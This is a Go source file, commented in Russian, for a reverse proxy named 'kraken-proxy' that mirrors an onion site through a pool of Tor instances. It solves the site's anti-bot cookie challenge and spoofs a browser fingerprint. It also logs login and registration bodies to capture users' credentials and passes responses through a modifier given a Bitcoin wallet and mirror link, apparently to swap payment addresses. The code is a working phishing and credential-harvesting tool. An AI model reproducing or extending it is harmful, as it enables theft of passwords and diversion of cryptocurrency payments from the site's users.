package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"kraken-proxy/config"
	"kraken-proxy/logging"
	"kraken-proxy/modification"
	"kraken-proxy/security"
	"kraken-proxy/session"
	"kraken-proxy/torpool"
	"kraken-proxy/utils"

	"golang.org/x/net/http2"
)

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// ProxyHandler обрабатывает HTTP запросы
type ProxyHandler struct {
	torPool        *torpool.Pool
	h2Transport    *http2.Transport
	modifier       *modification.ResponseModifier
	sessionManager *session.Manager
	targetURL      string
	cfg            *config.Config
}

func (h *ProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("[CLIENT] %s %s", r.Method, r.URL.String())

	// Получаем или создаем сессию
	sidCookie, _ := r.Cookie(h.cfg.SessionName)
	sid, sess := h.sessionManager.GetOrCreate(sidCookie, h.targetURL)

	// Устанавливаем cookie если это новая сессия
	if sidCookie == nil {
		http.SetCookie(w, &http.Cookie{Name: h.cfg.SessionName, Value: sid, Path: "/"})
	}

	targetHost := sess.Host
	targetScheme := sess.Scheme

	onionURL := &url.URL{
		Scheme:   targetScheme,
		Host:     targetHost,
		Path:     r.URL.Path,
		RawQuery: r.URL.RawQuery,
	}

	// Читаем body
	var reqBodyBytes []byte
	if r.Body != nil {
		reqBodyBytes, _ = io.ReadAll(r.Body)
		r.Body.Close()
	}
	if len(reqBodyBytes) > 0 {
		log.Printf("[REQUEST BODY] %s", string(reqBodyBytes))
		// Логируем креденшалы если это login/register
		logging.LogCredentials(r.URL.Path, reqBodyBytes)
	}

	// Создаем запрос
	req, err := http.NewRequestWithContext(r.Context(), r.Method, onionURL.String(), bytes.NewReader(reqBodyBytes))
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	// Копируем заголовки
	for key, values := range r.Header {
		keyLower := strings.ToLower(key)
		if keyLower == "cookie" || keyLower == "host" || keyLower == "referer" || keyLower == "origin" {
			continue
		}
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if len(reqBodyBytes) > 0 && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Host = onionURL.Host

	if ref := r.Header.Get("Referer"); ref != "" {
		if refURL, err := url.Parse(ref); err == nil {
			refURL.Host = onionURL.Host
			refURL.Scheme = onionURL.Scheme
			req.Header.Set("Referer", refURL.String())
		}
	}
	if origin := r.Header.Get("Origin"); origin != "" {
		if originURL, err := url.Parse(origin); err == nil {
			originURL.Host = onionURL.Host
			originURL.Scheme = onionURL.Scheme
			req.Header.Set("Origin", originURL.String())
		}
	}

	for _, c := range sess.GetCookies() {
		req.AddCookie(c)
	}

	sess.mu.RLock()
	hasTCK := sess.Cookies["TCK"] != nil
	sess.mu.RUnlock()

	// Получаем инстанс Tor из пула (round-robin)
	torInstance := h.torPool.GetInstance()
	log.Printf("[TOR] Используем инстанс %d", torInstance.ID)

	if hasTCK {
		log.Printf("[COOKIES SENT] %d cookies: %v (with TCK) [TOR-%d]", len(sess.GetCookies()), session.CookieNames(sess.GetCookies()), torInstance.ID)
	} else {
		log.Printf("[COOKIES SENT] %d cookies: %v [TOR-%d]", len(sess.GetCookies()), session.CookieNames(sess.GetCookies()), torInstance.ID)
	}

	// Выбираем транспорт
	var client *http.Client
	if strings.HasPrefix(onionURL.String(), "https://") {
		client = &http.Client{
			Transport: h.h2Transport,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	} else {
		client = &http.Client{
			Transport: torInstance.Transport,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	}

	resp, err := client.Do(req)
	if err != nil && strings.HasPrefix(onionURL.String(), "https://") {
		log.Printf("[FALLBACK HTTP/1.1] %s: %v", onionURL.String(), err)
		client.Transport = torInstance.Transport
		resp, err = client.Do(req)
		if err != nil {
			log.Printf("[ERR] %s: %v", onionURL.String(), err)
			http.Error(w, "Bad Gateway", http.StatusBadGateway)
			return
		}
	} else if err != nil {
		log.Printf("[ERR] %s: %v", onionURL.String(), err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}

	defer resp.Body.Close()

	proto := "HTTP/1.1"
	if resp.ProtoMajor == 2 {
		proto = "HTTP/2"
	}
	log.Printf("[PROTO] %s using %s [TOR-%d]", onionURL.String(), proto, torInstance.ID)

	sess.UpdateCookies(resp)

	redirectCount := 0
	maxRedirects := 10
	var bodyStr string

	for {
		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr = string(bodyBytes)

		// TCK extraction ТОЛЬКО на главной странице
		isMainPage := resp.Request.URL.Path == "/" || resp.Request.URL.Path == ""
		if isMainPage && strings.Contains(bodyStr, "toNumbers") && strings.Contains(bodyStr, "slowAES") {
			tck, err := utils.ComputeTCKFromJS(bodyBytes)
			if err == nil {
				sess.mu.Lock()
				sess.Cookies["TCK"] = &http.Cookie{Name: "TCK", Value: tck}
				sess.mu.Unlock()
				log.Printf("[SESSION] TCK extracted from main page: %s", tck)

				reLoc := regexp.MustCompile(`location\.href\s*=\s*"([^"]+)"`)
				locMatch := reLoc.FindStringSubmatch(bodyStr)
				if locMatch != nil {
					nextURL := resp.Request.URL.String()
					if strings.HasPrefix(locMatch[1], "http") {
						nextURL = locMatch[1]
					} else {
						u, _ := url.Parse(resp.Request.URL.String())
						nextURL = u.ResolveReference(&url.URL{Path: locMatch[1]}).String()
					}

					// Добавляем TCK в URL если его нет
					if !strings.Contains(nextURL, "tck=") {
						if strings.Contains(nextURL, "?") {
							nextURL += "&tck=" + url.QueryEscape(tck)
						} else {
							nextURL += "?tck=" + url.QueryEscape(tck)
						}
					}

					log.Printf("[SESSION] redirecting via location.href with TCK: %s", nextURL)

					newReq, _ := http.NewRequest("GET", nextURL, nil)
					newReq.Header.Set("User-Agent", userAgent)
					newReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
					newReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
					newReq.Host = newReq.URL.Host

					for _, c := range sess.GetCookies() {
						newReq.AddCookie(c)
					}

					client.Transport = h.h2Transport
					resp, err = client.Do(newReq)
					if err != nil {
						client.Transport = torInstance.Transport
						resp, err = client.Do(newReq)
						if err != nil {
							log.Printf("[ERR] TCK transition: %v", err)
							http.Error(w, "Bad Gateway", http.StatusBadGateway)
							return
						}
					}
					sess.UpdateCookies(resp)
					continue
				}
			}
		}

		// Обработка редиректов
		if resp.StatusCode >= 300 && resp.StatusCode < 400 && !utils.IsStaticAsset(r.URL.Path) && redirectCount < maxRedirects {
			redirectCount++
			loc, locErr := resp.Location()
			if locErr != nil || loc == nil {
				break
			}

			log.Printf("[REDIR %d] %d %s %s -> %s [TOR-%d]", redirectCount, resp.StatusCode, r.Method, resp.Request.URL.String(), loc.String(), torInstance.ID)

			// Сохраняем HTTPS и домен из редиректа
			if loc.Scheme != "" && loc.Scheme != "http" {
				log.Printf("[SESSION] scheme updated: %s://%s", loc.Scheme, loc.Host)
				sess.mu.Lock()
				sess.Scheme = loc.Scheme
				sess.Host = loc.Host
				sess.mu.Unlock()
			}

			sess.UpdateCookies(resp)

			newReq, err := http.NewRequest("GET", loc.String(), nil)
			if err != nil {
				break
			}

			for key, values := range req.Header {
				keyLower := strings.ToLower(key)
				if keyLower == "cookie" || keyLower == "host" || keyLower == "referer" || keyLower == "origin" || keyLower == "content-length" || keyLower == "content-type" {
					continue
				}
				for _, v := range values {
					newReq.Header.Add(key, v)
				}
			}
			newReq.Header.Set("User-Agent", userAgent)
			newReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			newReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
			newReq.Host = loc.Host
			newReq.Header.Set("Referer", req.URL.String())

			for _, c := range sess.GetCookies() {
				newReq.AddCookie(c)
			}

			// Выбираем транспорт в зависимости от схемы
			if strings.HasPrefix(loc.String(), "https://") {
				client.Transport = h.h2Transport
			} else {
				client.Transport = torInstance.Transport
			}

			resp, err = client.Do(newReq)
			if err != nil && strings.HasPrefix(loc.String(), "https://") {
				log.Printf("[FALLBACK] redirect failed, trying HTTP/1.1: %v", err)
				client.Transport = torInstance.Transport
				resp, err = client.Do(newReq)
				if err != nil {
					log.Printf("[ERR] redirect: %v", err)
					http.Error(w, "Bad Gateway", http.StatusBadGateway)
					return
				}
			} else if err != nil {
				log.Printf("[ERR] redirect: %v", err)
				http.Error(w, "Bad Gateway", http.StatusBadGateway)
				return
			}
			continue
		}

		break
	}

	sess.UpdateCookies(resp)

	if resp.Body != nil {
		resp.Body.Close()
	}
	resp.Body = io.NopCloser(strings.NewReader(bodyStr))
	if err := h.modifier.Modify(resp); err != nil {
		log.Printf("[MODIFY] %v", err)
	}

	log.Printf("[PROXY RESP] %d, Content-Type: %s, length: %d [TOR-%d]",
		resp.StatusCode, resp.Header.Get("Content-Type"), len(bodyStr), torInstance.ID)

	for k, vals := range resp.Header {
		if k == "Set-Cookie" {
			continue
		}
		for _, v := range vals {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

func main() {
	// Загружаем конфиг
	cfg := config.Load()

	// Создаем пул Tor инстансов
	pool, err := torpool.NewPool(cfg.TorSocksBasePort, cfg.TorInstances)
	if err != nil {
		log.Fatalf("Ошибка создания пула Tor: %v", err)
	}

	log.Printf("[TORPOOL] Создано %d Tor инстансов (порты %d-%d)", 
		pool.Count(), 
		cfg.TorSocksBasePort, 
		cfg.TorSocksBasePort+cfg.TorInstances-1)

	// Создаем HTTP/2 транспорт (для HTTPS)
	h2Transport, err := security.NewHTTP2Transport(fmt.Sprintf("127.0.0.1:%d", cfg.TorSocksBasePort))
	if err != nil {
		log.Fatalf("HTTP/2 Transport: %v", err)
	}

	// Создаем модификатор
	modifier := &modification.ResponseModifier{
		ProxyHost:  cfg.ProxyHost,
		WalletBTC:  cfg.WalletBTC,
		MirrorLink: cfg.MirrorLink,
	}

	// Создаем менеджер сессий
	sessionMgr := session.NewManager()

	// Создаем handler
	handler := &ProxyHandler{
		torPool:        pool,
		h2Transport:    h2Transport,
		modifier:       modifier,
		sessionManager: sessionMgr,
		targetURL:      cfg.InitialTarget,
		cfg:            cfg,
	}

	log.Printf("Proxy %s -> onion (uTLS Chrome 120 + HTTP/2 + %d Tor инстансов + круговая балансировка)", 
		cfg.ProxyHost, 
		cfg.TorInstances)

	log.Fatal(http.ListenAndServe(":8080", handler))
}
